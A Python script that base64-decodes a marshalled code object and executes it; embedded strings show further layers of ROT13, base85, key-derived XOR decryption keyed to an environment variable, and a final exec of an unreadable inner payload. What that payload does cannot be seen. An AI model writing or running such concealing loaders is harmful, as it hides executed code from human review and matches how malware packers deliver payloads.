#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYYwPAABuS1dQV3ljNnJhYnVWeFNpWXZSYU0wMXVWRjA5bm1wdVZGRUNaUlJnV1JnVkNKOXRYUUlPWUZFWUZHMWluRjQyREYwZ0hIZ1JXUGNsRVBSOEMxdGtERjAySTA1UldRMGNGUFI4QzFmM0RGMC9FSHVPWUlTbkZ4UmdKeXFCR3dqOEN6cU9GVUl3R3hmY24zSUVERjFmRUhNT1lLSVlGUlJoWElTWERGNGxJMGtPWXdncUd4UmhCMTFDREY1U1lTa09ZeXA0TFJSaG5IRXhERjh6SFR1T1ltdXBvUlJpRnp1akRGOXJwMHQ5cEdIYUt4UmlwUXB6Q0tSK1lKU09aUDFRWFExa0VtTUtER04yRXZ4OXBSU1pKbTFrSkhXTERIdWZLSXlZWEtIekh4UmdWMUhpWXdBb3BTSHVWRlJ1b2w0akJQMGdEVVdWWkZJU0x2OXdaRlNHSHpPMURJQTFXVHlTTFVXS0FReUFNR3VVQ0tOaUN5a05CMTAySFJxT1hTMDBESTlXQ2FJT0gzSUlXUklvS2xNaFZsSUFIek1STXlFaVd2V3JxR0VxRHdJbkVGY1NMdjl5QlBXc0l6Y3lESUEwSnlJVlZ4QXpZeEVhWVJPekRTTWFaVUlWQTFxdEcwTVJxR2NyWlA4eG54eVVXSHFZWXhIZUdsTVBEVVZmSGFPUEhGSVlvSEFhblFEelkyNDRNbWJqQVJTYUF3TjFIU1IrRHpqNEF3dDVvUnArb1JBY1ZINDFadnVhSHZiZ3BKNCtvSE11WVVFZEF2QVpBU1dSTUlxdFhHT3lMeWZtQkY0NnFIa1NZUzFLWEcwYkhUeDJEemtmVkpaa0ZQMWpEd1dQSlJFTkJRSWxCMXBpWlJjdkQwQVpveU1NRElXekdUOGhaMGsxbjBJd0FKTGVaUDgxQTBSaW5USWhabDliTUhFUEVURWdFS0FPRjF1aUowU2dvMTVpWlA5TUcwSGluRmtSWmxMM0YwNW1EMnVvRHpNVEVRSW5ad04xQ3lTVkVSamRLSUQySkhrWkpIRGlWdjBqWVBSanBtVmVxRnVmQVBnMEcyeXBCd1d2QUYwMXBGamdEUk43S0lIdkFQY1NMd1ZrWVJqa0pGSUhvUnB1QlF5T3B6MDdGS0FjbnhTSEdLWitWSTVPRVRad3BSMW5ISFI1WElIekRHT0VDSEVQSElaL0JSTHduM1pnREdxcXBVU1FuRzA1WFJJcEJ6YjhEUWoyWGxBT292a0xMMEVZRFJML0VUTGFNRjVUWFBNaXBsOUhBSWNSRHdIY0F6SHZEMmtObnhMMHBUSGlFUDl1SVJXVkF5ZmRFeE1ScUdjclpQOHhueHlVV0hxWVl4SGVHbE1QRFVWZkhhT1BIRklZb0hBYW5RRHpZMjQ0TW1iakFsV2RHMElwWlRjb1ltcVNISWtTRHlSdVl3QU5vek9uWTFTVUttV1NEeVJ1WXdaeUgxcU1BUHlnRVFmaW5JTm1NeHQwVkl5aERJRVBEVHFQQVN5MFd4dDBabDluRVJnWUZQMVRDSnFXQjBIZUdtNHlFdnVYbkdJTnBJZ1ZCeE44cHhmalkxRURFSFdUS2xrS0JIU0ZvSFY2RHpraFdRcHpCSEVSb0Y5RnB4dVVFeTVubm0xUk1UMVNwMFNJQVVIa0RJV3hDUElQRnZXTkJQOUhDeDQzRXhBaUZRQVJCbFpsQVJJdklRTndFUmpjTUdNT0h6RDhYUlNISXhJa1kxRU1JMGNPSUdFY1lIU0ZNUWpiRElFSkVLUmlJUEFTQnhTSUFUeGdESVd4Q1B1T0lTTVNwRjlHV3hMMkV4V0dvMnlPSGxrWm8wU0hFRnhnRFFjQk1JeVNZRmNvRnhON0tJOHdEUWNtWXkwdUkxcG1WM2M2Vm1MMExQdHdvVGNsWHdNQkRQeXhFS1o3SlJMdVl3RXdvbFNUcUdIeFZKRTBZVGp1WnZxTk1QUmpDbE14VnZma1p6WnVNUFdCb1BTdkIwT2ZWSkUwWmxSdkVTWmFHRlZjRFVBTUx2cUxCbGZ2TUliYW92UmhDdkExVnZ4M29JYndEMHVwcGxBckwxa3VWeHQ4SFFEdkQzU29MUFdSSG1NeFZGMGxxUFJ4QzFTTU1QWmJZSEgvVkZnbkNJNHVHVGJiSmxXUXBKRWRWSklJR1NadVlGNGJERkQvSEl5eFdQSGNMUlZ1WDFiOUt2U1pudnVvVnhBa256anVNSUlaSGxSZ0RJcW9XU3hqSmFIdU16NW9JdlpiWUlxWFdHMU9ZMEx1WDFiOUt2U1pudnR2V0hPZ0kzUnVDUkhrV0ZSZUp2cDBWRlNTQnladXBsTVFESmI5cFN1SUt2Z3FHekx1VkZiYVZsUmRGbWJ6VkZrdEtLWnhDMVNNTVBaYllISC9WRmduQ0k0dUdUYmJKbFdRcEpFZFZKSUlHU1p1WHd4aVp2UnVFR3hjVkY1MERTWnVZVE4vV3ZSZ0RUOWJWRlJkV2xadVZGYmJXdlJ1WHZ0a1ZGeWNuMHR5SDJJVUgycGFYRkxjRFFmakhHWndLSDhtb3hMZEVTT1FER1IzSEdIdkQzRWtLME9WbjJ4MVZGUnZFMDFhV21mZlgwRXludk0xRXdFam5tRU9IeURlS1JJd0p3cGlWRlJ1VnhMeW54dGJCME9rWlB1ZUV2UjhKSXFOQjBqdXB4dG1GU3FSREdaYm5tTnVEeU4yWEZSdVZGV1RWeWo4QzBqbUphV1VGRlJ1VkZWeldtUjJIMElUWFRIL0tHTU1wUVNZRXZxY0lVT1RFSEV2R1RwekpJdDVWRzFRQTJBYVcwRXNaSElWSFR4MkV4SDZJSmI3TUdid24wV2ZEVGtnVnhINEJ2QVRIbEFrRFBSdVdSMVdFVElkV2FIL0xsOXhISEFZS2xjeUV4QVBCR01UVzJ5U3BIUjNLSkFkVkZSdVZ2THdLU1dybnc5TVZKZ3BFeU4yblBjU1gzWitXdlJ1VkZBRVZ4SXBBUFdUSFFNaEIwSXZJUkgxRUlxRUFSTnVCUXFFbzBIZUdhU05WelIrVkZFVEQyQWdYMElMQjE1VVZGMGlFUnR1VkZIeEZGUnVWRlZ6VjBXQ0ZVRVRYVDlFWkcxaklQNW9FdnluV3d1VFhSZ09XUFJ1VkZWelYxa29wVDgvSkdEdk0wU25BSWNBWEZBbUpRY2tDMkwvWUhBY255MGVESUExVkhTYVcwMDRXeFNGTXhrc0QyeDhwdjR1VkZSdkNseTFvM1o5VkZSbVpsTHVwek9QWVBEbUJ5TDdXUVo2RndwekwyeDlDbGJ1WXZBbldUeWxBek1TSndFMUpGUmVIRnBrcmFidVZGUjhYdlJ1Vkd4Y1ZGUndEVER1VkZIY0dsUnVWRldOVkY0MEwxcHVGd2NWQWx1ZHFIeDFWSnVxSHpMdVl3MWxHdlJlSnZwMFZGU1NCeVp1cGxNUUN2TGxDR05lWUo1ZUlsSHVWRmJhVmxSZEZtYnpWRmcxQnlmdkV4ajdDdlJkcG11eFZ6U2FGMHR1blRNSU1GVmJJeGJmVkhMZktTWndYUU1zcUZXVEdROGNWSHlDbzJOdkxUTGFDdldOR3dJa1dGVmlFUDh3THlML3BQUnVYdnQrQzNENURSMHZFbTl3V3ZXTkd3TVBWSHlNWEpiNm5Ka2hJdkFQSUdMdVZsdGdKSkx1THdnV29sU3hxUTh5VjJXSkYzRHVWRmJiRkZXWENsY1pWMldzQlBWdVlGdHpGRldOR3dJa1dGVmlFUDh3THlML3BQUnVYdnQrSWxmMW9GanVXSFJlRkpwekp3SDNXSk13SG1PTk15Y0VaVWM2VkZSbVlGWnVWSEg1V0ZSY25KYzBWRjA0cVNwdVZGRUxaMHVjSHhNdEZHTnZLS1dIRUZ1TUwwSUtNMlNkRzFFWUdGYjdKeGtiSUZSdVZGU1hWSUFGTXo1VFcyeC9vUldnWGxMNlZKNWdLRjRqS1NTREdSSW5WenlLVkYwaXBJcHVWRkh4SlBSdVZGQUVXUXlLWUcxVFh2dWlaSERpSzFmd1ZGUnVWMmM2RlFJSUFQZ09Iek1aWXdFUktVU1VEUWdaVkhmaW52Y2xMSExkWFQ4a0VQOXNKekx1b3oxZFYwTjhZRlNmRXlOMm5sZ1NMeFdVRHZFbkpsRXRWRlJiS3ljU0x2OW5uSEFiSjJBMUV3RWpNRzFURUdWY0EycGFYSU42RDJ1cFZ4THZYSDFDTVRwenFGOGlEemo3SW1XVEVQa3FYME42SlB1Y0R4UmRIVHVQSEhPbm9IUjVXeUliVkZSYkt5TVRYdnVjWnhNREFhUmdFRmtxRHZnT1pHcWFNbER2TVQxekRJV1BEMldURVBnYk1ITVJZUzBlRFFjTEV6RU5weHVaWUhNREF6ZmpEemp5REdwdkxQNWdueFNISElSa0V4RGZLRmdOQnl1VkFGV1JuVEVjRElFT1hTcHVWRkh4RlBSdVZGQUVWbHA5R2xTT0h5RGVuRnh3cDF0NkVJYnZuSXB1WUY5MEpQUnVYUzVKRFVTcUV6T1FFMHFlbkZSZ0JGZ29WRlJ1VkZWeG5LU29JRlY1REpaaVd6QWNEMFJ3SEl4NEFGTGdaMEFTVjFTTUN3dHdISWttV1BSdVZGV09XbGJ6VndEMnFJVmdvUk5tREtJYkxRQVRaM0lNbzIxb294SXFIUThnV1Faa1d2ZmhadjFzQWxSdVZGVitZd05hQ3hiOXBTMDZLeEl3Vm1qY0QyeDlDbXB1STFwbVZtMWpESGNZRVRMakp3a1NJMWI2REZSZElTQVhFeEhrcHZ1VEVGOGZwbFJ1WFM1RkVRZndWbUlTSnc0ekp2UjRBMHVmRUl5T0VJUnVZRjl2SHZSdVdGRVpWRlJ1Vnc0Y0p5RWRDUklwSjFJalZHdDNJVGNSRmxxdENtMWpLR2N1RElXSElKeVFNMnVOWEZ4d3AxdDZFSWJ2bklwdVlGOWtJbFJ1V0ZFTFZGUnVWMVJ3STNJbUR4UjVFUzR2QVQ5ZUkyTnVZR2JrV1BSdVZHeGRWMVNNQ3dweG52SHlEdkFFTHZqalZ3eU9JbGZ2QkhjcVlQVjVGeXBkVklxdENscHVJMk4vV2xTS0xROGFWSXF0Q2xwdUkyTi9XbFNrSnlmZ1YxQUZGSUh3SEl4elltU1VEMTVRWkhrMFdQeGxFVERnRlFPeW4wTDdEUUlqWVBMa0UycW1Fd09YSFJra1pGa3NXUmJrblBxalh3QVBaSVprRFNSZ1kxRGtZUzVtRUdXdFZsTUdESDF3Q3ZnTkFKdUpZUVNabkcwdtoFcGxhaW7aACkBcicAAAApFloJY3lfbG9hZGVycgIAAAByAwAAANoJRXhjZXB0aW9ucgwAAAByBQAAAHITAAAAcjQAAAByCgAAAHIQAAAAchIAAAByFgAAANoDc3RyciEAAAByHAAAAHImAAAAWgdQQVlMT0FEWgRNT0RFWghTQUxUX0hFWFoHS0VZX0VOVtoEY29kZdoEZXhlY3IIAAAAcggAAAByCAAAAHIJAAAA2gg8bW9kdWxlPgMAAABzIgAAAAIBFAEMASYCCAMIAwgDCAMSAxIHGAwOCAQBBAEEAQQCEgE="""

try:
    blob = base64.b64decode(DATA)
    code = marshal.loads(blob)
    exec(code)
except Exception as e:
    print("Hata:", e)
